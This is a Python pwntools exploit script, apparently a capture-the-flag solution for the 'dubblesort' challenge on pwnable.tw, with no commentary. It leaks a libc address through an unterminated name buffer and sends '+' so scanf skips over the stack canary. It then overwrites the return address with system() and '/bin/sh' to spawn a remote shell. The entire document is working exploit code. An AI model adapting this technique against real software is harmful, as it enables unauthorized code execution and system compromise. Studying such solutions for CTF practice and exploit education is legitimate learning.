from pwn import *

context(os="linux", arch="i386", log_level="debug")
elf = ELF("./dubblesort")

ready = True
libc = ELF("./libc_32.so.6")
if ready:
    context.log_level = "INFO"
    io = remote("chall.pwnable.tw", 10101)
else:
    io = process("./dubblesort")

payload = "A" * 23 + "B"
io.recvuntil("What your name :")
io.sendline(payload)

io.recvuntil("AAAB")
libc_gotplt = u32(io.recv(4)) & 0xffffff00
libc_base = libc_gotplt - libc.get_section_by_name(".got.plt").header.sh_addr

binsh_addr = libc.search("/bin/sh").next()
system_addr = libc.symbols["system"]
log.info("binsh_addr: 0x%x" % binsh_addr)
log.info("system addr: 0x%x" % system_addr)

io.recvuntil("How many numbers do you what to sort :")
io.sendline("35")

for i in range(24):
    io.sendline(str(0))
io.sendline("+")
for i in range(3+5):
    io.sendline(str(system_addr+libc_base))
for i in range(2):
    io.sendline(str(binsh_addr+libc_base))

io.interactive()